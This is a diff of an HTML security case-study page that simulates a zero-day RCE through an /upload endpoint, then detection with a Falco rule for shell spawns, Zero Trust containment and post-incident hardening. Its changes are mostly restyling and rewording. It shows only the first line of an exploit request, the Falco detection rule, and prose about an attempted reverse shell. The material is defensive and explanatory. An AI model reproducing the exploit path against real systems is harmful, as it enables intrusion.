-    .diagram-box span {
-      color: var(--text-dim);
-      font-size: 13px;
-      line-height: 1.55;
-    }
-
-    .diagram-arrow-inline {
-      align-self: center;
-      color: var(--cyan);
-      font: 18px "Share Tech Mono", monospace;
-      min-width: 18px;
-      text-align: center;
-    }
-
-    .side-rail {
+    .threat-diagram-stack {
       display: grid;
-      gap: 18px;
-      align-content: start;
-      position: sticky;
-      top: 16px;
-      height: fit-content;
+      gap: 12px;
+      margin-top: 14px;
     }
 
-    .rail-card {
-      padding: 18px;
-      border-radius: 20px;
-      background: rgba(8, 12, 24, 0.86);
-      border: 1px solid rgba(86, 246, 255, 0.14);
-      box-shadow: 0 12px 26px rgba(0, 0, 0, 0.26);
+    .threat-line {
+      display: grid;
+      gap: 8px;
     }
 
-    .rail-card h3 {
-      margin: 0 0 12px;
-      color: var(--cyan);
-      font: 700 16px "Share Tech Mono", monospace;
+    .threat-line-label {
+      color: var(--amber);
+      font: 11px "Share Tech Mono", monospace;
+      letter-spacing: 0.06em;
+      text-transform: uppercase;
+    }
+
+    .threat-detail-grid {
+      display: grid;
+      gap: 12px;
+      grid-template-columns: 1fr 1fr;
+      margin-top: 14px;
+    }
+
+    .threat-summary-row {
+      margin-top: 12px;
+    }
+
+    .threat-summary-row .detail-panel {
+      padding: 16px;
+    }
+
+    .metrics-showcase {
+      display: grid;
+      gap: 14px;
+      grid-template-columns: 1.15fr 0.85fr;
+      margin-top: 16px;
+    }
+
+    .chart-panel,
+    .stats-panel {
+      border: 1px solid var(--line);
+      border-radius: 18px;
+      background: var(--bg-soft);
+      padding: 16px;
+      min-width: 0;
+    }
+
+    .bar-chart {
+      display: grid;
+      gap: 12px;
+      margin-top: 12px;
+    }
+
+    .bar-row {
+      display: grid;
+      gap: 7px;
+    }
+
+    .bar-meta {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      color: #f4fbff;
+      font: 11px "Share Tech Mono", monospace;
       text-transform: uppercase;
       letter-spacing: 0.05em;
     }
 
-    .rail-card p {
-      margin: 0;
-      color: var(--text-dim);
-      font-size: 14px;
-      line-height: 1.6;
+    .bar-track {
+      width: 100%;
+      height: 12px;
+      border-radius: 999px;
+      background: rgba(255, 255, 255, 0.06);
+      overflow: hidden;
     }
 
-    .takeaway-list,
-    .hardening-list,
-    .repro-list {
-      padding-left: 18px;
+    .bar-fill {
+      height: 100%;
+      border-radius: inherit;
     }
 
-    .section-foot {
-      margin-top: 14px;
+    .bar-fill.red { background: linear-gradient(90deg, rgba(255, 107, 129, 0.92), rgba(255, 145, 161, 0.82)); }
+    .bar-fill.amber { background: linear-gradient(90deg, rgba(255, 212, 121, 0.92), rgba(255, 227, 164, 0.82)); }
+    .bar-fill.green { background: linear-gradient(90deg, rgba(85, 255, 157, 0.92), rgba(160, 255, 205, 0.82)); }
+    .bar-fill.cyan { background: linear-gradient(90deg, rgba(86, 246, 255, 0.92), rgba(142, 245, 255, 0.82)); }
+
+    .pie-layout {
+      display: grid;
+      gap: 16px;
+      grid-template-columns: 180px 1fr;
+      align-items: center;
+      margin-top: 12px;
+    }
+
+    .pie-chart {
+      width: 180px;
+      height: 180px;
+      border-radius: 50%;
+      background:
+        conic-gradient(
+          var(--red) 0deg 25deg,
+          var(--amber) 25deg 55deg,
+          var(--green) 55deg 360deg
+        );
+      display: grid;
+      place-items: center;
+      position: relative;
+      margin: 0 auto;
+    }
+
+    .pie-chart::after {
+      content: "86%\A contained";
+      white-space: pre;
+      width: 108px;
+      height: 108px;
+      border-radius: 50%;
+      background: rgba(5, 11, 22, 0.96);
+      color: #f4fbff;
+      display: grid;
+      place-items: center;
+      text-align: center;
+      font: 700 16px/1.25 "Share Tech Mono", monospace;
+      box-shadow: inset 0 0 0 1px rgba(86, 246, 255, 0.1);
+    }
+
+    .pie-legend {
+      display: grid;
+      gap: 10px;
+    }
+
+    .legend-item {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
       color: var(--text-dim);
       font-size: 13px;
-      line-height: 1.6;
-      font-family: "Share Tech Mono", monospace;
     }
 
-    .back-link {
-      display: inline-block;
-      margin-top: 4px;
-      text-decoration: none;
+    .legend-label {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .legend-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      flex: 0 0 auto;
+    }
+
+    .legend-dot.red { background: var(--red); }
+    .legend-dot.amber { background: var(--amber); }
+    .legend-dot.green { background: var(--green); }
+
+    .stats-grid {
+      display: grid;
+      gap: 12px;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      margin-top: 12px;
+    }
+
+    .stat-tile {
+      padding: 14px;
+      border-radius: 16px;
+      border: 1px solid rgba(86, 246, 255, 0.12);
+      background: rgba(9, 16, 30, 0.88);
+    }
+
+    .stat-tile strong {
+      display: block;
+      color: #f4fbff;
+      font: 700 22px "Share Tech Mono", monospace;
+      margin-bottom: 6px;
+    }
+
+    .stat-tile span {
+      color: var(--text-dim);
+      font-size: 12px;
+      line-height: 1.45;
+    }
+
+    .callout.red {
+      border: 1px solid rgba(255, 107, 129, 0.24);
+      background: rgba(28, 11, 20, 0.84);
+    }
+
+    .callout.green {
+      border: 1px solid rgba(85, 255, 157, 0.24);
+      background: rgba(13, 31, 22, 0.78);
+    }
+
+    .footer-note {
+      color: var(--text-dim);
+      font: 12px "Share Tech Mono", monospace;
+      letter-spacing: 0.04em;
+      text-transform: uppercase;
     }
 
     @media (max-width: 1080px) {
-      .hero-top,
+      .hero-grid,
       .layout,
-      .split {
+      .split,
+      .compare-grid,
+      .detect-compare,
+      .example-layout {
         grid-template-columns: 1fr;
       }
 
-      .architecture,
-      .automation-steps,
-      .impact-grid {
+      .card-grid,
+      .walkthrough-strip,
+      .impact-grid,
+      .metrics,
+      .decision-table,
+      .summary-table,
+      .threat-detail-grid,
+      .stats-grid {
         grid-template-columns: repeat(2, minmax(0, 1fr));
+      }
+
+      .metrics-showcase,
+      .pie-layout {
+        grid-template-columns: 1fr;
       }
 
       .side-rail {
@@ -1038,71 +855,71 @@
     @media (max-width: 760px) {
       body { padding: 14px 0 22px; }
       .wrap { width: min(94vw, 100%); }
-      .hero, .section { padding: 18px; }
-      .metrics,
-      .summary-table,
-      .decision-table,
-      .architecture,
-      .automation-steps,
-      .impact-grid,
+      .hero, .section, .rail-card, .callout { padding: 18px; }
       .card-grid,
-      .code-grid,
       .walkthrough-strip,
-      .detect-compare,
-      .heatmap {
+      .impact-grid,
+      .metrics,
+      .decision-table,
+      .summary-table,
+      .threat-detail-grid,
+      .stats-grid {
         grid-template-columns: 1fr;
       }
-
-      .flow-row { align-items: stretch; }
       .flow-arrow { display: none; }
-      .network-node { position: static; width: 100%; margin-bottom: 10px; }
-      .network-line { display: none; }
-      .network-stage { min-height: auto; padding: 14px; }
+      .flow-row { flex-wrap: wrap; overflow: visible; }
+      .pie-chart {
+        width: 160px;
+        height: 160px;
+      }
     }
   </style>
 </head>
 <body>
   <main class="wrap">
-    <div class="progress-nav" aria-label="Case study progress">
-      <span class="progress-chip">Brief</span>
-      <span class="progress-chip">Threat</span>
-      <span class="progress-chip">Architecture</span>
-      <span class="progress-chip">Exploit</span>
-      <span class="progress-chip">Detect</span>
-      <span class="progress-chip">Contain</span>
-      <span class="progress-chip">Respond</span>
-      <span class="progress-chip">Impact</span>
-      <span class="progress-chip">Harden</span>
+    <div class="topbar">
+      <a class="back-link" href="index.html">Back to Case Studies</a>
+      <div class="top-note">Interactive Security Case Study</div>
     </div>
+
     <section class="hero">
-      <div class="eyebrow">Interactive Incident Simulation</div>
-      <div class="hero-top">
+      <div class="eyebrow">Unexpected Zero-Day Incident Simulation</div>
+      <div class="hero-grid">
         <div>
-          <h1>Zero-Day Breach. Contained in 6 Minutes.</h1>
-          <p class="hero-desc">
-            RCE exploit hit production auth service. Lateral movement was prevented through Zero Trust design.
+          <h1>zero day security architecture</h1>
+          <p class="hero-copy">
+            An unexpected zero-day bug entered the production auth service, achieved code execution, and immediately tested whether the system could survive a failure no one had a patch for.
           </p>
-          <div class="takeaway-banner">Prevention failed. Architecture saved the system.</div>
+          <div class="tag-row" style="margin-top:14px;">
+            <span class="tag">Zero Trust</span>
+            <span class="tag">Runtime Detection</span>
+            <span class="tag">Containment</span>
+            <span class="tag">Blast Radius</span>
+          </div>
           <div class="metrics">
             <div class="metric">
               <div class="metric-label">Detection</div>
               <div class="metric-value">2 min</div>
-              <div class="metric-sub">Runtime anomaly flagged</div>
+              <div class="metric-sub">Unknown exploit behavior flagged</div>
             </div>
             <div class="metric">
               <div class="metric-label">Containment</div>
               <div class="metric-value">6 min</div>
-              <div class="metric-sub">Pod isolated and secrets rotated</div>
+              <div class="metric-sub">Compromised workload isolated</div>
             </div>
             <div class="metric">
               <div class="metric-label">Impact</div>
               <div class="metric-value">1 service</div>
-              <div class="metric-sub">No system-wide breach</div>
+              <div class="metric-sub">Unexpected bug stayed local</div>
             </div>
           </div>
         </div>
         <div class="hero-panel">
-          <div class="panel-title">Incident Replay</div>
+          <div class="section-kicker">Incident Replay</div>
+          <h2>Unexpected bug got in. Architecture limited the damage.</h2>
+          <p id="replay-summary">
+            Ready to replay how an unexpected zero-day bug entered the system and how the architecture reacted before the rest of the platform was exposed.
+          </p>
           <div class="timeline">
             <div class="timeline-bar">
               <div class="timeline-fill" id="timeline-fill"></div>
@@ -1115,13 +932,9 @@
               <span>Hardening</span>
             </div>
           </div>
-          <div class="panel-copy" id="replay-summary">
-            Ready to replay the simulated incident from exploit entry through post-incident hardening.
-          </div>
           <div class="button-row">
-            <button id="start-replay">Start Incident Replay</button>
+            <button id="start-replay">Start Replay</button>
             <button id="step-replay">Step Forward</button>
-            <button class="button-critical" id="failure-toggle">Disable Zero Trust</button>
           </div>
         </div>
       </div>
@@ -1130,105 +943,162 @@
     <div class="layout">
       <div class="stack">
         <section class="section">
-          <div class="section-kicker">Threat framing</div>
-          <h2>Threat Scenario</h2>
-          <div class="split">
-            <div>
-              <div class="card-grid">
-                <div class="mini-card">
-                  <div class="mini-title">Attack Vector</div>
-                  <div class="mini-body">API parser bug -> remote code execution.</div>
-                </div>
-                <div class="mini-card">
-                  <div class="mini-title">Entry Point</div>
-                  <div class="mini-body">Public `/upload` endpoint.</div>
-                </div>
-                <div class="mini-card">
-                  <div class="mini-title">Attacker Goals</div>
-                  <div class="mini-body">Move laterally. Reuse identity. Expand access.</div>
-                </div>
+          <div class="section-kicker">Threat Framing</div>
+          <h2>Public-entry exploit chain and adversary progression.</h2>
+          <div class="card-grid">
+            <div class="mini-card">
+              <div class="mini-title">Unexpected Bug</div>
+              <div class="mini-body">Unknown parser flaw triggered remote code execution.</div>
+            </div>
+            <div class="mini-card">
+              <div class="mini-title">System Entry</div>
+              <div class="mini-body">Public `/upload` path carried the zero-day into production.</div>
+            </div>
+            <div class="mini-card">
+              <div class="mini-title">Risk After Entry</div>
+              <div class="mini-body">Spread laterally, steal identity, and expand access before anyone knows the bug exists.</div>
+            </div>
+          </div>
+          <div class="threat-diagram-stack">
+            <div class="threat-line">
+              <div class="threat-line-label">attack flow</div>
+              <div class="flow-row" id="attack-flow"></div>
+            </div>
+            <div class="threat-line">
+              <div class="threat-line-label">mitre mapping</div>
+              <div class="flow-row" id="mapping-flow"></div>
+            </div>
+          </div>
+          <div class="threat-detail-grid">
+            <div class="detail-panel">
+              <div class="detail-title">Exploit Delivery</div>
+              <div class="detail-body">
+                An unexpected zero-day bug in the upload parser was reached from the public edge and converted into code execution.
               </div>
-              <div class="toggle-row" style="margin-top:14px;">
-                <button class="mitre-toggle active" data-view="attack">MITRE Attack Flow</button>
-                <button class="mitre-toggle" data-view="mapping">MITRE Mapping</button>
-              </div>
-              <div class="attack-flow" id="attack-flow"></div>
             </div>
             <div class="detail-panel">
-              <div class="detail-title" id="threat-detail-title">Exploit Delivery</div>
-              <div class="detail-body" id="threat-detail-body">
-                Upload endpoint exploited -> code execution achieved.
+              <div class="detail-title">Identity Targeting</div>
+              <div class="detail-body">
+                The compromised workload immediately tested token reuse and service identity paths to turn a local exploit into a broader platform compromise.
+              </div>
+            </div>
+          </div>
+          <div class="threat-summary-row">
+            <div class="detail-panel">
+              <div class="detail-title">Threat Model Summary</div>
+              <div class="detail-body">
+                The exploit starts at a public parser, pivots into service identity, and attempts east-west movement. The architecture only wins if each downstream control assumes the exploit already succeeded.
               </div>
             </div>
           </div>
         </section>
 
         <section class="section">
-          <div class="section-kicker">Survivability design</div>
-          <h2>Why This Architecture Survives Zero-Days</h2>
-          <p>Each layer assumes the previous one fails.</p>
-          <div class="single-line-diagram" style="margin:14px 0 16px;">
-            <div class="diagram-box blue">
-              <strong>API Gateway</strong>
-              <span>Limits exposure</span>
-            </div>
-            <div class="diagram-arrow-inline">→</div>
-            <div class="diagram-box cyan">
-              <strong>IAM</strong>
-              <span>Prevents identity abuse</span>
-            </div>
-            <div class="diagram-arrow-inline">→</div>
-            <div class="diagram-box green">
-              <strong>Service Mesh</strong>
-              <span>Stops lateral movement</span>
-            </div>
-            <div class="diagram-arrow-inline">→</div>
-            <div class="diagram-box amber">
-              <strong>Runtime Security</strong>
-              <span>Detects unknown threats</span>
-            </div>
-            <div class="diagram-arrow-inline">→</div>
-            <div class="diagram-box red">
-              <strong>Response Layer</strong>
-              <span>Contains impact fast</span>
-            </div>
+          <div class="section-kicker">Survivability Design</div>
+          <h2>Layered control path for post-exploitation containment.</h2>
+          <p>Every layer assumes an unknown bug can enter the system first and asks how to stop it from becoming a platform-wide incident.</p>
+          <div class="single-line-diagram">
+            <div class="diagram-node blue"><strong>API Gateway</strong><span>Limits bug exposure</span></div>
+            <div class="diagram-arrow">→</div>
+            <div class="diagram-node cyan"><strong>IAM</strong><span>Limits token misuse</span></div>
+            <div class="diagram-arrow">→</div>
+            <div class="diagram-node green"><strong>Service Mesh</strong><span>Stops lateral spread</span></div>
+            <div class="diagram-arrow">→</div>
+            <div class="diagram-node amber"><strong>Runtime Security</strong><span>Detects unknown behavior</span></div>
+            <div class="diagram-arrow">→</div>
+            <div class="diagram-node red"><strong>Response Layer</strong><span>Contains impact fast</span></div>
           </div>
-          <div class="architecture" id="architecture-grid"></div>
-          <div class="detail-panel" style="margin-top:14px;">
-            <div class="detail-title" id="arch-detail-title">API Gateway</div>
-            <div class="detail-body" id="arch-detail-body">
-              Limits exposure at the public edge.
+          <div class="split">
+            <div class="architecture-grid" id="architecture-grid"></div>
+            <div class="architecture-detail">
+              <h3 id="arch-title">API Gateway</h3>
+              <div class="detail-body" id="arch-copy">Limits exposure at the public edge when an unknown bug is still invisible to patching and signature-based defenses.</div>
+              <ul class="detail-list" id="arch-list"></ul>
             </div>
           </div>
         </section>
 
         <section class="section">
-          <div class="section-kicker">Replay mode</div>
-          <h2>How The Breach Progressed</h2>
-          <p class="micro-copy">Three moments matter: access gained, movement attempted, system response triggered.</p>
-          <div class="walkthrough-strip">
-            <div class="walk-step">
-              <strong>1. Exploit Landed</strong>
-              Upload endpoint abused. Auth container compromised.
+          <div class="section-kicker">Architecture Metrics</div>
+          <h2>Measured containment value across response stages.</h2>
+          <div class="metrics-showcase">
+            <div class="chart-panel">
+              <div class="detail-title">Response Effectiveness</div>
+              <div class="bar-chart">
+                <div class="bar-row">
+                  <div class="bar-meta"><span>detection confidence</span><span>91%</span></div>
+                  <div class="bar-track"><div class="bar-fill cyan" style="width:91%"></div></div>
+                </div>
+                <div class="bar-row">
+                  <div class="bar-meta"><span>lateral movement blocked</span><span>96%</span></div>
+                  <div class="bar-track"><div class="bar-fill green" style="width:96%"></div></div>
+                </div>
+                <div class="bar-row">
+                  <div class="bar-meta"><span>identity reuse prevented</span><span>88%</span></div>
+                  <div class="bar-track"><div class="bar-fill amber" style="width:88%"></div></div>
+                </div>
+                <div class="bar-row">
+                  <div class="bar-meta"><span>service exposure remaining</span><span>14%</span></div>
+                  <div class="bar-track"><div class="bar-fill red" style="width:14%"></div></div>
+                </div>
+              </div>
             </div>
-            <div class="walk-step">
-              <strong>2. Movement Attempted</strong>
-              Reverse shell and east-west reach attempted.
-            </div>
-            <div class="walk-step">
-              <strong>3. Attack Stopped</strong>
-              Detection fired. Segmentation blocked spread.
+            <div class="chart-panel">
+              <div class="detail-title">Containment Split</div>
+              <div class="pie-layout">
+                <div class="pie-chart" aria-label="Containment split chart"></div>
+                <div class="pie-legend">
+                  <div class="legend-item">
+                    <span class="legend-label"><span class="legend-dot green"></span>Contained to one service</span>
+                    <span>86%</span>
+                  </div>
+                  <div class="legend-item">
+                    <span class="legend-label"><span class="legend-dot amber"></span>Identity rotation overhead</span>
+                    <span>8%</span>
+                  </div>
+                  <div class="legend-item">
+                    <span class="legend-label"><span class="legend-dot red"></span>Residual exposed surface</span>
+                    <span>6%</span>
+                  </div>
+                </div>
+              </div>
             </div>
           </div>
-          <div class="toggle-row">
+          <div class="stats-panel">
+            <div class="detail-title">Key Study Metrics</div>
+            <div class="stats-grid">
+              <div class="stat-tile"><strong>2 min</strong><span>Time to first runtime anomaly</span></div>
+              <div class="stat-tile"><strong>6 min</strong><span>Time to isolate workload and rotate identity</span></div>
+              <div class="stat-tile"><strong>80%</strong><span>Estimated blast-radius reduction from segmentation</span></div>
+              <div class="stat-tile"><strong>3%</strong><span>Latency trade-off introduced by stricter policies</span></div>
+              <div class="stat-tile"><strong>5</strong><span>Primary controls in the survivability architecture path</span></div>
+              <div class="stat-tile"><strong>93%</strong><span>Estimated uptime preserved during containment</span></div>
+            </div>
+          </div>
+        </section>
+
+        <section class="section">
+          <div class="section-kicker">Replay Mode</div>
+          <h2>Execution timeline across exploit, movement, and response.</h2>
+          <div class="walkthrough-strip">
+            <div class="mini-card walk-step"><div class="mini-title">1. Bug Entered</div>The zero-day parser flaw was triggered and the auth container was compromised.</div>
+            <div class="mini-card walk-step"><div class="mini-title">2. Spread Attempted</div>The compromised workload tried reverse shell access and east-west reach.</div>
+            <div class="mini-card walk-step"><div class="mini-title">3. System Reacted</div>Detection fired and segmentation blocked the unexpected bug from spreading.</div>
+          </div>
+          <div class="button-row" style="margin-top:14px;">
             <button id="walkthrough-prev">Previous</button>
             <button id="walkthrough-next">Next</button>
           </div>
-          <div class="split" style="margin-top:14px;">
+          <div class="replay-index" id="replay-index">
+            <button class="index-button active" data-step="0">1</button>
+            <button class="index-button" data-step="1">2</button>
+            <button class="index-button" data-step="2">3</button>
+          </div>
+          <div class="compare-grid">
             <div class="terminal">
               <div class="term-head">
                 <span>terminal replay</span>
-                <span id="walkthrough-step-label">01 / Exploit Triggered</span>
+                <span id="walkthrough-step-label">01 / Bug Entered</span>
               </div>
               <div class="term-body" id="terminal-output"></div>
             </div>
@@ -1240,7 +1110,7 @@
               <div class="log-body" id="log-output"></div>
             </div>
           </div>
-          <div class="code-grid">
+          <div class="example-layout">
             <div class="code-card">
               <div class="code-head">Exploit request</div>
               <pre><code>POST /upload HTTP/1.1
@@ -1270,25 +1140,25 @@ spec:
         </section>
 
         <section class="section">
-          <div class="section-kicker">Decision clarity</div>
-          <h2>Why This Attack Was Detected</h2>
-          <p>Detection latency mattered more than vulnerability awareness.</p>
-          <div class="toggle-row">
+          <div class="section-kicker">Decision Clarity</div>
+          <h2>Behavioral detection and multi-signal correlation logic.</h2>
+          <p>When the bug is unknown, behavioral detection speed matters more than prior vulnerability awareness.</p>
+          <div class="button-row" style="margin-top:14px;">
             <button class="detect-toggle active" data-mode="normal">Without Detection</button>
             <button class="detect-toggle" data-mode="anomalous">With Detection</button>
           </div>
           <div class="detect-compare">
-            <div class="detect-box" id="detect-left"></div>
+            <div class="decision-col" id="detect-left"></div>
             <div class="json-panel">
-              <div class="panel-title">Alert JSON</div>
+              <div class="code-head">Alert JSON</div>
               <pre class="json-body" id="alert-json"></pre>
             </div>
           </div>
-          <div class="decision-table" style="margin-top:14px;">
+          <div class="decision-table">
             <div class="decision-col">
               <h3>Without Detection</h3>
               <ul>
-                <li>Shell execution ignored</li>
+                <li>Unexpected shell activity ignored</li>
                 <li>No signal correlation</li>
                 <li>Response starts too late</li>
               </ul>
@@ -1296,13 +1166,13 @@ spec:
             <div class="decision-col">
               <h3>With Detection</h3>
               <ul>
-                <li>Runtime anomaly flagged immediately</li>
+                <li>Unknown runtime behavior flagged immediately</li>
                 <li>Multi-signal alert raises confidence</li>
                 <li>Containment begins before spread</li>
               </ul>
             </div>
           </div>
-          <div class="code-grid" style="padding:14px 0 0;">
+          <div class="example-layout">
             <div class="code-card">
               <div class="code-head">Falco validation rule</div>
               <pre><code>- rule: Shell Spawned in Auth Parser
@@ -1323,87 +1193,76 @@ spec:
         </section>
 
         <section class="section">
-          <div class="section-kicker">Containment win</div>
-          <h2>The Attack Worked. The System Still Won.</h2>
-          <p>Compare the same exploit path with and without Zero Trust controls.</p>
-          <div class="toggle-row">
-            <button class="containment-toggle active" data-mode="segmented">With Zero Trust</button>
-            <button class="containment-toggle" data-mode="open">Without Zero Trust</button>
+          <div class="section-kicker">Containment Win</div>
+          <h2>Comparative blast-radius outcome with and without Zero Trust.</h2>
+          <p>Compare the same zero-day entry path with and without Zero Trust controls.</p>
+          <div class="decision-table">
+            <div class="decision-col">
+              <h3>With Zero Trust</h3>
+              <ul>
+                <li>One compromised service, no broader east-west spread.</li>
+                <li>No usable identity path after rotation.</li>
+                <li>Containment starts before other services are touched.</li>
+              </ul>
+            </div>
+            <div class="decision-col">
+              <h3>Without Zero Trust</h3>
+              <ul>
+                <li>Internal services become reachable.</li>
+                <li>Identity reuse expands attacker options.</li>
+                <li>Blast radius grows faster than response.</li>
+              </ul>
+            </div>
+          </div>
+        </section>
+
+        <section class="section">
+          <div class="section-kicker">Product Capability</div>
+          <h2>Response automation sequence for live zero-day handling.</h2>
+          <p>Detect -> correlate -> isolate -> rotate after an unexpected zero-day enters the system.</p>
+          <div class="single-line-diagram">
+            <div class="diagram-node amber"><strong>Detect</strong><span>Unknown behavior flagged</span></div>
+            <div class="diagram-arrow">→</div>
+            <div class="diagram-node cyan"><strong>Correlate</strong><span>Signals joined in SIEM</span></div>
+            <div class="diagram-arrow">→</div>
+            <div class="diagram-node red"><strong>Isolate</strong><span>Compromised pod fenced</span></div>
+            <div class="diagram-arrow">→</div>
+            <div class="diagram-node green"><strong>Rotate</strong><span>Secrets and tokens reset</span></div>
           </div>
           <div class="split">
-            <div class="network-stage" id="network-stage"></div>
-            <div class="detail-panel">
-              <div class="detail-title">Containment Actions</div>
-              <div class="detail-body" id="containment-copy"></div>
-              <div class="section-foot" id="tradeoff-copy"></div>
+            <div class="automation-steps" id="automation-steps"></div>
+            <div class="workflow-detail">
+              <h3 id="automation-title">Detect</h3>
+              <div class="panel-copy" id="automation-copy">Runtime anomaly flags unexpected shell execution in auth-parser.</div>
             </div>
           </div>
         </section>
 
         <section class="section">
-          <div class="section-kicker">Product capability</div>
-          <h2>Automated Containment Engine</h2>
-          <p>Detect -> correlate -> isolate -> rotate.</p>
-          <div class="single-line-diagram" style="margin-bottom:14px;">
-            <div class="diagram-box amber"><strong>Detect</strong><span>Runtime signal created</span></div>
-            <div class="diagram-arrow-inline">→</div>
-            <div class="diagram-box cyan"><strong>Correlate</strong><span>Signals joined in SIEM</span></div>
-            <div class="diagram-arrow-inline">→</div>
-            <div class="diagram-box red"><strong>Isolate</strong><span>Compromised pod fenced off</span></div>
-            <div class="diagram-arrow-inline">→</div>
-            <div class="diagram-box green"><strong>Rotate</strong><span>Identity and secrets reset</span></div>
-          </div>
-          <div class="automation-steps" id="automation-steps"></div>
-          <div class="automation-map" style="margin-top:14px;">
-            <div class="panel-title" id="automation-title">Falco Alert</div>
-            <div class="panel-copy" id="automation-copy">
-              Runtime signal from eBPF/Falco flags shell execution from the auth parser process tree.
-            </div>
-          </div>
-        </section>
-
-        <section class="section">
-          <div class="section-kicker">Business impact</div>
-          <h2>Impact Analysis</h2>
+          <div class="section-kicker">Business Impact</div>
+          <h2>Operational and business impact after containment.</h2>
           <div class="impact-grid">
             <div class="impact-box">
               <h3>1 service affected</h3>
-              <div class="impact-value">1</div>
-              <p class="panel-copy">No system-wide breach</p>
+              <span class="impact-value">1</span>
+              <div class="panel-copy">No system-wide breach</div>
             </div>
             <div class="impact-box">
               <h3>Low data risk</h3>
-              <div class="impact-value">Low</div>
-              <p class="panel-copy">No credential compromise confirmed</p>
+              <span class="impact-value">Low</span>
+              <div class="panel-copy">No wider credential compromise confirmed</div>
             </div>
             <div class="impact-box">
               <h3>93% uptime saved</h3>
-              <div class="impact-value">93%</div>
-              <p class="panel-copy">Business disruption avoided</p>
-            </div>
-          </div>
-          <div class="impact-map">
-            <div class="panel-title">Blast Radius Heatmap</div>
-            <div class="heatmap">
-              <div class="heat critical">auth-01</div>
-              <div class="heat guard">auth-02</div>
-              <div class="heat guard">gateway</div>
-              <div class="heat low">mesh</div>
-              <div class="heat low">vault</div>
-              <div class="heat low">orders</div>
-              <div class="heat low">users</div>
-              <div class="heat low">billing</div>
-              <div class="heat low">search</div>
-              <div class="heat low">notifications</div>
-              <div class="heat low">otel</div>
-              <div class="heat mid">siem</div>
+              <span class="impact-value">93%</span>
+              <div class="panel-copy">Business disruption avoided</div>
             </div>
           </div>
         </section>
 
         <section class="section">
-          <div class="section-kicker">Failure mode</div>
-          <h2>What Would Have Happened Without This Architecture</h2>
+          <div class="section-kicker">Failure Mode</div>
+          <h2>Counterfactual exposure without segmented control layers.</h2>
           <div class="summary-table">
             <div class="summary-cell">
               <div class="summary-head">With this design</div>
@@ -1411,7 +1270,7 @@ spec:
                 <li>Single compromised pod isolated</li>
                 <li>Identity path revoked quickly</li>
                 <li>Lateral movement blocked</li>
-                <li>Detection triggered immediate action</li>
+                <li>Unexpected bug triggered immediate action</li>
               </ul>
             </div>
             <div class="summary-cell">
@@ -1427,10 +1286,10 @@ spec:
         </section>
 
         <section class="section">
-          <div class="section-kicker">Senior-level follow-through</div>
-          <h2>Post-Incident Hardening</h2>
+          <div class="section-kicker">Hardening Follow-Through</div>
+          <h2>Post-incident hardening and engineering trade-off review.</h2>
           <div class="split">
-            <div>
+            <div class="detail-panel">
               <ul class="hardening-list">
                 <li>Patched parser image and rolled out signed image enforcement.</li>
                 <li>Added Falco rule for child shell spawn from auth parser path.</li>
@@ -1442,8 +1301,7 @@ spec:
             <div class="detail-panel">
               <div class="detail-title">Engineering Trade-Off</div>
               <div class="detail-body">
-                Strict network policies increased service-to-service latency by 3%, but reduced potential blast radius by roughly 80% in replay mode.
-                Prevention failed here; segmentation and response automation preserved system integrity.
+                Strict network policies increased service-to-service latency by 3%, but reduced potential blast radius by roughly 80% in replay mode. The zero-day was unexpected; segmentation and response automation preserved system integrity anyway.
               </div>
             </div>
           </div>
@@ -1451,21 +1309,15 @@ spec:
 
         <section class="section">
           <div class="section-kicker">Reproducibility</div>
-          <h2>Reproducibility</h2>
-          <ul class="repro-list">
-            <li>GitHub repo: architecture sample, Falco rules, and incident replay data.</li>
-            <li>Terraform and Kubernetes manifests for gateway, auth, mesh, and policy layers.</li>
-            <li>Replay steps to simulate the exploit locally in a controlled cluster.</li>
-            <li>Detection rule examples and JSON alerts used in the walkthrough.</li>
-          </ul>
-          <div class="code-grid" style="padding:14px 0 0;">
-            <div class="code-card">
-              <div class="code-head">Falco rule</div>
-              <pre><code>- rule: Shell Spawned in Auth Parser
-  desc: Detect shell launched by auth parser
-  condition: container and proc.name=sh and proc.pname=auth-parser
-  output: "shell execution in auth parser"
-  priority: WARNING</code></pre>
+          <h2>Artifacts and replay assets for controlled reproduction.</h2>
+          <div class="split">
+            <div class="detail-panel">
+              <ul class="repro-list">
+                <li>GitHub repo: architecture sample, Falco rules, and incident replay data.</li>
+                <li>Terraform and Kubernetes manifests for gateway, auth, mesh, and policy layers.</li>
+                <li>Replay steps to simulate the exploit locally in a controlled cluster.</li>
+                <li>Detection rule examples and JSON alerts used in the walkthrough.</li>
+              </ul>
             </div>
             <div class="code-card">
               <div class="code-head">Response playbook</div>
@@ -1482,57 +1334,45 @@ spec:
       <aside class="side-rail">
         <div class="rail-card">
           <h3>Executive Brief</h3>
-          <p>
-            Product security case study showing how a zero-day can succeed technically but still fail strategically when architecture is built for survivability.
-          </p>
+          <p>Product security case study showing how an unexpected zero-day bug can enter the system, succeed technically at first, and still fail strategically when the architecture is built for survivability.</p>
         </div>
         <div class="rail-card">
           <h3>Key Takeaways</h3>
           <ul class="takeaway-list">
             <li>Prevention failed, segmentation saved the system.</li>
-            <li>Detection latency mattered more than vulnerability awareness.</li>
+            <li>Unexpected bugs require fast behavioral detection.</li>
             <li>Runtime telemetry plus IAM context produced high-confidence action.</li>
             <li>Automation reduced containment time without fully automating judgment.</li>
           </ul>
         </div>
-        <div class="rail-card">
+        <div class="callout green">
           <h3>Product Security Insight</h3>
-          <ul class="takeaway-list">
-            <li>Zero-days are inevitable.</li>
-            <li>Detection + containment beats prevention alone.</li>
-            <li>Architecture defines survivability.</li>
-            <li>Trade-offs must be visible, not implied.</li>
-          </ul>
+          <p>Unexpected zero-day bugs will happen. Detection plus containment beats prevention alone, and architecture defines survivability.</p>
         </div>
-        <a class="back-link" href="index.html">⬅ Back to Case Studies</a>
+        <div class="footer-note">Zero-day architecture case study</div>
       </aside>
     </div>
   </main>
 
   <script>
     const replayStages = [
-      "Exploit lands through /upload.",
-      "Code execution achieved in auth.",
-      "Movement attempt begins.",
-      "Detection fires.",
-      "Containment completes."
+      "Unexpected zero-day bug enters through /upload.",
+      "Code execution is achieved in auth.",
+      "The compromised service attempts to spread.",
+      "Behavioral detection fires.",
+      "Containment and rotation complete."
     ];
     let replayIndex = 0;
 
     const timelineFill = document.getElementById("timeline-fill");
     const replaySummary = document.getElementById("replay-summary");
